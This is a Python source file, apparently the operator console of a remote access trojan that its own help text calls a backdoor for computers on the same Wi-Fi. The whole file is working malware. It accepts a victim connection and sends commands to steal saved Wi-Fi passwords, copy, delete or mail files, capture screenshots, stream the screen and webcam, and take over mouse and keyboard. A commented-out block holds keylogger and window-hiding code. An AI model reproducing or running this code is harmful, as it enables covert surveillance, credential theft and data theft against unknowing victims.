from os import system

#system("pip install easyocr")
"""system("pip install sockets")
system("pip install opencv-python")
system("pip install pypi-stat")
system("pip install comtypes")"""
# Добавляем необходимые подклассы - MIME-типы
import subprocess
import cv2
import socket
from requests import get
import stat
import os, time

global cd
cd = False


def waiting(s, client):
    client.close()
    s.close()
    print("Ждём..")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 8888))
    s.listen(5)
    client, addr = s.accept()
    time.sleep(10)


def ch_dir(dir):
    command = "ch_dir " + dir
    client.send(command.encode("cp866"))
    # subprocess.getoutput("dir")


def py_to_exe(filename):
    client.send(("py_to_exe:" + filename).encode("cp65001"))
    print(client.recv(1024 * 1024 * 1024).decode("utf-8"))


"""
def def_hide():
    class myThread(threading.Thread):
        def __init__(self, threadID, name, counter):
            threading.Thread.__init__(self)
            self.threadID = threadID
            self.name = name
            self.counter = counter
        def run(self):
            main()

    def hide():
        import win32console, win32gui
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, 0)
        return True

    # Запуск кейлогера
    def main():
        hm.KeyDown = OnKeyboardEvent
        hm.HookKeyboard()
        pythoncom.PumpMessages()

    hide()
    hm = pyHook.HookManager()
    disallow_Multiple_Instances()
    thread = myThread(1, "Thread", 1)
    thread.start()
"""


def read_file(command):
    client.send((command.encode("utf-8")))


def hlp():
    print(r"""
┌────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   /\ ─ ├ │ └ ┐ ┘ ┌ /\                                                  │
│                //┌───────────────────────────────────────────────────┐\\                               │
│                //│Util for backdoor to the computer by ip in one wifi│\\                               │
│                //└───────────────────────────────────────────────────┘\\                               │
│                                   \/ ─ ├ │ └ ┐ ┘ ┌ \/                                                  │
│                //for ├─ commands ypu can use >> to write the log into file.                            │
│                //Example: show_wifi_pass >>                                                            │
│                //Result: show_wifi_pass.txt                                                            │
│cd [-D] - CHANGE DIRECTORY OR DISK: -D - DIRECTORY                                                      │
│ch_dir [-D] - CHANGE DIRECTORY OR DISK: -D - DIRECTORY                                                  │
│cp_dir [-D] - COPY DIRECTORY TO THE EMAIL: -D - DIRECTORY                                               │
│cpy_mail [-F] - COPY FILE TO THE EMAIL (AUDIO, TEXT, VIDEO): -F - FILE                                  │
│cpy [-F] - COPY FILE TO THE SERVER'S COMPUTER: -F - FILE                                                │
│hlp - SHOW THIS WINDOW                                                                                  │
│send_video [-T] - SEND VIDEO TO THE TELEGRAM: -T - TIME (IN SECONDS)                                    │
│send_file [-F] - SEND FILE TO THE CLIENT: -F - FILE                                                     │
│edit [-F] - EDIT TEXT FILE IN NOTEPAD: -F - FILE                                                        │
│py_to_exe: [-F] - CONVERT PY FILE TO EXE FILE AND SAVE IN THE DIRECTORY WITH NAME OF THE FILE: -F - FILE│
├─read [-F] - READ TEXT FILE OR SHOW ALL FILES AND DIRECTORIES IN DIRECTORY: -F - FILE OR DIRECTORY      │
│delete [-N] - DELETE FILE FROM THE DIRECTORY OR DIRECTORY: -N - NAME                                    │
│screenshot - SEND THE SCREENSHOT TO THE EMAIL                                                           │
│make_d [-N] - MAKING DIRECTORY WITH NAME: -N - NAME                                                     │
├─show_geo - SHOWS GLOBAL, LOCAL IP, GEOLOCATION                                                         │
├─show_wifi_pass - SHOW SAVED WIFI PASSWORDS                                                             │
│//check_wifi - SHOWS RESULT OF {ARP -A} COMMAND - (useless)                                             │
│abbort_client [-N] - KILL THE CONNECTION WITH CLIENT: -N - NUMBER OF A CLIENT                           │
├─find_file [-N] - FIND FILE OR DIRECTORY: -N - NAME                                                     │
│spy [-C] - START SPYING SCREEN OR WEBCAM: -C - COMMAND (screen/webcam/stop_screen/stop_webcam/mouse)    │
│   1. screen - START SHOWING SCREEN OF THE CLIENT                                                       │
│   2. webcam - START SHOWING WEBCAM OF THE CLIENT                                                       │
│   3. mouse - NOW, YOU CONTROL THE MOUSE OF THE CLIENT (SCROLL TO STOP)                                 │
│   4. stop_screen - STOP 1.                                                                             │
│   5. stop_webcam - STOP 2.                                                                             │
│<beta!:>                                                                                                │
│    {                                                                                                   │
│        (don't open window)                                                                             │
│            lock [-P] - LOCKS A COMPUTER: -P - PASWORD                                                  │
│        (don't work as it should)                                                                       │
│            abbort - KILL THE SERVER                                                                    │
│    }                                                                                                   │
│</beta!:>                                                                                               │
│//def_hide - default alg to hide client program                                                         │
│//send_v1deo - default alg to send screen video if computers are not connected (in 2 times faster)      │
│dialog - START WRITING MESSAGES TO THE CLIENT TO NOTEPAD                                                │
│kboard# [-C] - WORK WITH KEYBOARD: -C - COMMAND                                                         │
│    1. writeing [-T] - WRITEING TEXT TO THE COMP: -T - TEXT                                             │
│    2. hotk [-K] [-T] - ADD HOTKEY TO WRITE TEXT: -K - KEY, -T - TEXT                                   │
└────────────────────────────────────────────────────────────────────────────────────────────────────────┘
    """)


def dub_edit():
    or_co1 = ""
    or_co = ""
    print("Input a code by a line:")
    while or_co1 != "abberation":
        or_co1 = input(">> ")
        if or_co1 != "abberation":
            or_co += or_co1
    return or_co


def communicate():
    print("Writing a message: ")
    while True:
        mesg = input()
        if mesg == "Stop":
            client.send(command.encode("cp65001"))
            break
        client.send(mesg.encode("cp65001"))


class StreamingServer:
    """
    Class for the streaming server.
    Attributes
    ----------
    Private:
        __host : str
            host address of the listening server
        __port : int
            port on which the server is listening
        __slots : int
            amount of maximum avaialable slots (not ready yet)
        __used_slots : int
            amount of used slots (not ready yet)
        __quit_key : chr
            key that has to be pressed to close connection
        __running : bool
            inicates if the server is already running or not
        __block : Lock
            a basic lock used for the synchronization of threads
        __server_socket : socket
            the main server socket
    Methods
    -------
    Private:
        __init_socket : method that binds the server socket to the host and port
        __server_listening: method that listens for new connections
        __client_connection : main method for processing the client streams
    Public:
        start_server : starts the server in a new thread
        stop_server : stops the server and closes all connections
    """

    # TODO: Implement slots functionality
    def __init__(self, host, port, slots=8, quit_key='q'):
        """
        Creates a new instance of StreamingServer
        Parameters
        ----------
        host : str
            host address of the listening server
        port : int
            port on which the server is listening
        slots : int
            amount of avaialable slots (not ready yet) (default = 8)
        quit_key : chr
            key that has to be pressed to close connection (default = 'q')
        """

        import socket
        import threading

        self.__host = host
        self.__port = port
        self.__slots = slots
        self.__used_slots = 0
        self.__running = False
        self.__quit_key = quit_key
        self.__block = threading.Lock()
        self.__server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__init_socket()

    def __init_socket(self):
        """
        Binds the server socket to the given host and port
        """
        self.__server_socket.bind((self.__host, self.__port))

    def start_server(self):
        """
        Starts the server if it is not running already.
        """
        import threading
        if self.__running:
            print("Server is already running")
        else:
            self.__running = True
            server_thread = threading.Thread(target=self.__server_listening)
            server_thread.start()

    def __server_listening(self):
        """
        Listens for new connections.
        """
        import threading

        self.__server_socket.listen()
        while self.__running:
            self.__block.acquire()
            connection, address = self.__server_socket.accept()
            if self.__used_slots >= self.__slots:
                print("Connection refused! No free slots!")
                connection.close()
                self.__block.release()
                continue
            else:
                self.__used_slots += 1
            self.__block.release()
            thread = threading.Thread(target=self.__client_connection, args=(connection, address,))
            thread.start()

    def stop_server(self):
        """
        Stops the server and closes all connections
        """
        if self.__running:
            self.__running = False
            closing_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            closing_connection.connect((self.__host, self.__port))
            closing_connection.close()
            self.__block.acquire()
            self.__server_socket.close()
            self.__block.release()
        else:
            print("Server not running!")

    def __client_connection(self, connection, address):
        """
        Handles the individual client connections and processes their stream data.
        """
        import cv2

        import pickle
        import struct
        payload_size = struct.calcsize('>L')
        data = b""

        while self.__running:

            break_loop = False

            while len(data) < payload_size:
                received = connection.recv(4096)
                if received == b'':
                    connection.close()
                    self.__used_slots -= 1
                    break_loop = True
                    break
                data += received

            if break_loop:
                break

            packed_msg_size = data[:payload_size]
            data = data[payload_size:]

            msg_size = struct.unpack(">L", packed_msg_size)[0]

            while len(data) < msg_size:
                data += connection.recv(4096)

            frame_data = data[:msg_size]
            data = data[msg_size:]

            frame = pickle.loads(frame_data, fix_imports=True, encoding="bytes")
            frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
            cv2.imshow(str(address), frame)
            if cv2.waitKey(1) == ord(self.__quit_key):
                connection.close()
                self.__used_slots -= 1
                break


def edit(command):
    client.send(command.encode("cp65001"))

def mouse(client=None):
    client.send((command.encode("cp65001")))
    from pynput import mouse

    def on_move(x, y):
        print(('Pointer moved to {0}'.format(
            (x, y))))
        client.send(('Pointer moved to {0}'.format(
            (x, y))).encode("cp65001"))

    def on_click(x, y, button, pressed):
        print(('{0} at {1}'.format(
            'Pressed' if pressed else 'Released',
            (x, y))))
        client.send(('{0} at {1}'.format(
            'Pressed' if pressed else 'Released',
            (x, y))).encode("cp65001"))

    def on_scroll(x, y, dx, dy):
        print(('Scrolled {0} at {1}'.format(
            'down' if dy < 0 else 'up',
            (x, y))))
        client.send(('Scrolled {0} at {1}'.format(
            'down' if dy < 0 else 'up',
            (x, y))).encode("cp65001"))
        return False

    # Collect events until released
    with mouse.Listener(
        on_move=on_move,
        on_click=on_click,
        on_scroll=on_scroll,
        ) as listener:
        listener.join()


    """import pyautogui

    x, y = pyautogui.position()

    while True:
        if x != pyautogui.position()[0]:
            if y != pyautogui.position()[1]:
                x, y = pyautogui.position()
                client.send(str(str(x) + " " + str(y)).encode("cp65001"))"""



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
local_ip = str(socket.gethostbyname(socket.gethostname()))
gp = get("http://api.ipify.org").text
print(local_ip)
print(gp)
s.bind(("0.0.0.0", 8888))
s.listen(5)
client, addr = s.accept()
command = ""
# keys = []
g = True
ch_dir_ch = False
cur_dir = client.recv(1024).decode("cp65001")
print("Type hlp to see list of commands")
client.send(gp.encode("cp65001"))
while True:
    try:
        command = input(cur_dir + ">> ")
        if "send_video" == command.split(" ")[0]:
            client.send((command.encode("cp65001")))
            time.sleep(int(command.split(" ")[-1]))
        elif "cpy_mail" == command.split(" ")[0]:
            client.send(command.encode("utf-8"))
        elif "show_wifi_pass" == command.split(" ")[0]:
            client.send(command.encode("utf-8"))
            guts = client.recv(4096).decode("utf-8")
            print(guts)
            if len(command.split(" ")) == 2:
                f = open(command.split(' ')[0] + ".txt", "w", encoding="utf-8")
                f.write(guts)
                f.close()
        elif "send_file" == command.split(" ")[0]:
            f = open(command.split(" ")[-1], "r", encoding='utf-8')
            client.send((command).encode("utf-8"))
            client.send((f.read()).encode("utf-8"))
            f.close()
        elif "cpy" == command.split(" ")[0]:
            read_file(command)
            result_output = client.recv(4096 * 1024).decode("utf-8")
            name = (command.split(" ")[-1]).split(".")[0] + "_cpied." + (command.split(" ")[-1]).split(".")[-1]
            f = open(name, "w", encoding="utf-8")
            f.write(result_output)
            f.close()
            print("\nDestination of copied file is " + os.path.abspath(name) + "\n")
        elif "screenshot" == command:
            client.send(command.encode("cp65001"))
        elif command == "dialog":
            client.send(command.encode("cp65001"))
            communicate()
        elif "lock" == command:
            client.send(command.encode("cp65001"))
        elif "py_to_exe" == command.split(":")[0]:
            fi = (command.split(":"))[-1]
            py_to_exe(fi)
        elif "read" == command.split(" ")[0]:
            read_file(command)
            result_output = client.recv(4096 * 1024).decode("utf-8")
            print(result_output)
            cr = command.split(" ")
            if cr[-1] == ">>":
                cr[1] = cr[1].replace(".", "^")
                nm = cr[0] + "_" + cr[1] + ".txt"
                f = open(nm, "w", encoding="utf-8")
                f.write(result_output)
                f.close()
        elif "check_wifi" == command:
            client.send(command.encode("cp65001"))
            print(client.recv(4096).decode("utf-8"))
        elif "cls" == command or "clear" == command:
            os.system("cls")
        elif "cd" == command.split(" ")[0]:
            if not ch_dir_ch:
                # i = input("Did you mean 'ch_dir'? (Y/N)").lower()
                i = "y"
                if i == "y":
                    ch_dir((command.split(" "))[-1])
                    cur_dir = client.recv(1024).decode("cp65001")
                    # u = input("Do you want to change 'cd' command to 'ch_dir' automaticaly? (Y/N)").lower()
                    u = "y"
                    if u == "y":
                        ch_dir_ch = True
                        continue
                    else:
                        ch_dir_ch = False
                else:
                    print("Unavailable command.")
                    pass
            if ch_dir_ch:
                if "cd" in command:
                    command = "ch_dir " + (command.split(" "))[-1]
                    ch_dir((command.split(" "))[-1])
                    cur_dir = client.recv(1024).decode("cp65001")
        elif "ch_dir" == command.split(" ")[0]:
            ch_dir((command.split(" "))[-1])
            cur_dir = client.recv(1024).decode("cp65001")
        elif "spy" == command.split(" ")[0]:
            if g:
                _ = socket.gethostbyname(socket.gethostname())
                server = StreamingServer(_, 9999)
                server.start_server()
            g = False
            if "mouse" == command.split(" ")[-1]:
                mouse(client)
            client.send((command.encode("cp65001")))
        elif "delete" == command.split(" ")[0]:
            client.send((command.encode("cp65001")))
        elif command == "hlp":
            hlp()
            continue
        elif "make_d" == command.split(" ")[0]:
            client.send((command.encode("cp65001")))
            cur_dir = client.recv(1024).decode("cp65001")
        elif "show_geo" == command:
            client.send((command.encode("cp65001")))
            guts = (client.recv(4096).decode("cp65001"))
            print(guts)
            if len(command.split(" ")) == 2:
                f = open(command.split(" ")[0] + ".txt", "w", encoding="utf-8")
                f.write(guts)
                f.close()
        elif "edit" == command.split(" ")[0]:
            edit(command)
            original_code = client.recv(1024).decode("utf-8")
            print(original_code)
            with open("temp.txt", "w") as file:
                file.write(original_code)
                file.close()
            os.system("start temp.txt")
            ready = input("Are you ready? ")

            file = open("temp.txt", "r")
            p = file.read()
            # print(client.recv(1024).decode("cp65001"))
            client.send(p.encode("utf-8"))
            print(client.recv(1024).decode("utf-8"))
            file.close()
            os.chmod(os.path.abspath("temp.txt"), stat.S_IWRITE)
            os.system("del temp.txt")
        elif "find_file" == command.split(" ")[0]:
            client.send((command).encode("cp65001"))
            guts = client.recv(1024).decode("utf-8")
            print(guts)
            if ">>" in command.split(" "):
                f = open(((command.replace(" ", "_")).replace(".", "^")).replace(">", "") + ".txt", "w",
                         encoding="utf-8")
                f.write(guts)
                f.close()
        elif "kboard" == command.split("#")[0]:
            client.send(command.encode("cp65001"))
        elif "abbort_client" == command.split(" ")[0]:
            client.send(command.split(" ")[0].encode("cp65001"))
        elif "abbort" == command:
            exit(1)
        elif command == "" or command == "\n":
            client.send(command.encode("cp65001"))
        else:
            client.send(command.encode("cp65001"))
            result_output = client.recv(4096).decode("cp65001").split("╨Т┬а")
            print(" ".join(result_output))
    except ConnectionResetError and ConnectionAbortedError:
        if "abbort" == command:
            exit(1)
        client.close()
        s.close()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("0.0.0.0", 8888))
        s.listen(5)
        client, addr = s.accept()
    except:
        client.close()
        s.close()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("0.0.0.0", 8888))
        s.listen(5)
        client, addr = s.accept()
client.close()
s.close()
